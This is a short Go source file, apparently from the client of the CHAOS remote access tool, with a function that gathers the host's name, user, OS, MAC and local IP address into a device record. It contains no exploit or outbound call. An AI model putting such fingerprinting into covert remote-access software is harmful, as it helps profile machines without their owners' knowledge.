package util

import (
	"github.com/tiagorlampert/CHAOS/client/app/models"
	"github.com/tiagorlampert/CHAOS/client/app/util/network"
	"os"
	"os/user"
	"runtime"
	"time"
)

func LoadDeviceSpecs() *models.Device {
	hostname, _ := os.Hostname()
	username, _ := user.Current()
	macAddr, _ := network.GetMacAddress()
	return &models.Device{
		Hostname:       hostname,
		Username:       username.Name,
		UserID:         username.Username,
		OSName:         runtime.GOOS,
		MacAddress:     macAddr,
		LocalIPAddress: network.GetLocalIP().String(),
		FetchedUnix:    time.Now().UnixNano(),
	}
}
